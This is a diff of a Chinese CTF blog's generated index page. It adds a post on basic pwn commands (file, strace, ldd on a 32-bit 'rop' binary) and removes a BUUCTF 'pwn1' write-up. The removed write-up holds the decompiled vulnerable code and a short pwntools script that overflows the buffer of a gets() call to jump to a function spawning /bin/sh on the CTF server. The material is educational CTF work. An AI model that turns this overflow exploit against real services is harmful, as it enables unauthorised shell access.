@@ -251,6 +251,150 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/pwn常用的命令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/30/pwn常用的命令/" itemprop="url">linux下pwn常用的命令</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-30T17:44:38+08:00">
+                2019-07-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/理论知识/" itemprop="url" rel="index">
+                    <span itemprop="name">理论知识</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><p>持续更新的文章 因为一时半会总结不出来 用到多少写多少吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">这里用rop做例子</span><br><span class="line">查看文件 32位文件</span><br><span class="line">xfgg@ubuntu:~/Downloads$ file rop</span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=a6c3ab368d8cd315e3bb2b970556ed0510bca094, not stripped</span><br><span class="line"></span><br><span class="line">查看文件保护机制</span><br><span class="line">xfgg@ubuntu:~/Downloads$ file rop</span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=a6c3ab368d8cd315e3bb2b970556ed0510bca094, not stripped</span><br><span class="line"></span><br><span class="line">分析文件调用了哪些系统调用</span><br><span class="line">strace ./rop</span><br><span class="line">execve(<span class="string">"./rop"</span>, [<span class="string">"./rop"</span>], 0x7ffe697d85e0 /* 55 vars */) = -1 ENOENT (No such file or directory)</span><br><span class="line">fstat(2, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...&#125;) = 0</span><br><span class="line">write(2, <span class="string">"strace: exec: No such file or di"</span>..., 40strace: <span class="built_in">exec</span>: No such file or directory</span><br><span class="line">) = 40</span><br><span class="line">getpid()                                = 2180</span><br><span class="line">exit_group(1)                           = ?</span><br><span class="line">+++ exited with 1 +++</span><br><span class="line"> 我这里出现问题，一直提示没有这个文件</span><br><span class="line">因为在64位系统上运行32位文件</span><br><span class="line">sudo apt-get install lib32stdc++6 即可</span><br><span class="line">重新来一次</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Desktop$ strace ./rop</span><br><span class="line">execve(<span class="string">"./rop"</span>, [<span class="string">"./rop"</span>], 0x7fff2dbf80f0 /* 51 vars */) = 0</span><br><span class="line">strace: [ Process PID=2479 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">brk(NULL)                               = 0x8634000</span><br><span class="line">access(<span class="string">"/etc/ld.so.nohwcap"</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7f58000</span><br><span class="line">access(<span class="string">"/etc/ld.so.preload"</span>, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">"/etc/ld.so.cache"</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat64(3, &#123;st_mode=S_IFREG|0644, st_size=80654, ...&#125;) = 0</span><br><span class="line">mmap2(NULL, 80654, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7f44000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">access(<span class="string">"/etc/ld.so.nohwcap"</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">"/lib32/libc.so.6"</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">"\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\220\1\0004\0\0\0"</span>..., 512) = 512</span><br><span class="line">fstat64(3, &#123;st_mode=S_IFREG|0755, st_size=1926828, ...&#125;) = 0</span><br><span class="line">mmap2(NULL, 1935900, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7d6b000</span><br><span class="line">mprotect(0xf7f3d000, 4096, PROT_NONE)   = 0</span><br><span class="line">mmap2(0xf7f3e000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d2000) = 0xf7f3e000</span><br><span class="line">mmap2(0xf7f41000, 10780, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7f41000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">set_thread_area(&#123;entry_number=-1, base_addr=0xf7f590c0, <span class="built_in">limit</span>=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1&#125;) = 0 (entry_number=12)</span><br><span class="line">mprotect(0xf7f3e000, 8192, PROT_READ)   = 0</span><br><span class="line">mprotect(0x8049000, 4096, PROT_READ)    = 0</span><br><span class="line">mprotect(0xf7f85000, 4096, PROT_READ)   = 0</span><br><span class="line">munmap(0xf7f44000, 80654)               = 0</span><br><span class="line">getegid32()                             = 1000</span><br><span class="line">setresgid32(1000, 1000, 1000)           = 0</span><br><span class="line"><span class="built_in">read</span>(0, </span><br><span class="line"><span class="string">"\n"</span>, 256)                      = 1</span><br><span class="line">write(1, <span class="string">"Hello, World\n"</span>, 13Hello, World</span><br><span class="line">)          = 13</span><br><span class="line">exit_group(13)                          = ?</span><br><span class="line">+++ exited with 13 +++</span><br><span class="line">成功了  我还看不太懂这个 慢慢研究了</span><br><span class="line"></span><br><span class="line">查看libc文件的位置和地址</span><br><span class="line">xfgg@ubuntu:~/Desktop$ ldd rop</span><br><span class="line">	linux-gate.so.1 (0xf7fc1000)</span><br><span class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7dcf000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7fc3000)</span><br><span class="line"></span><br><span class="line">提升文件的权限</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Desktop$ chmod 777 rop</span><br></pre></td></tr></table></figure>
+
+<h3 id="gdb的运用"><a href="#gdb的运用" class="headerlink" title="gdb的运用"></a>gdb的运用</h3><h3 id="ROP的运用"><a href="#ROP的运用" class="headerlink" title="ROP的运用"></a>ROP的运用</h3>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/DynELF的应用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1643,151 +1787,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/pwn1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/27/pwn1/" itemprop="url">pwn1</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T19:14:56+08:00">
-                2019-07-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/BUUCTF/" itemprop="url" rel="index">
-                    <span itemprop="name">BUUCTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">很简单的栈溢出 </span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+1h] [rbp-Fh]</span><br><span class="line"></span><br><span class="line">  puts(<span class="string">"please input"</span>);</span><br><span class="line">  gets(&amp;s, argv);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  puts(<span class="string">"ok,bye!!!"</span>);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int fun()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不解释，前面有一样的</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(<span class="string">'buuoj.cn'</span>,6001)</span><br><span class="line">fun_addr=0x0000000000401186</span><br><span class="line">payload=<span class="string">'a'</span>*0x0f+<span class="string">'a'</span>*8+p64(fun_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1838,7 +1837,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
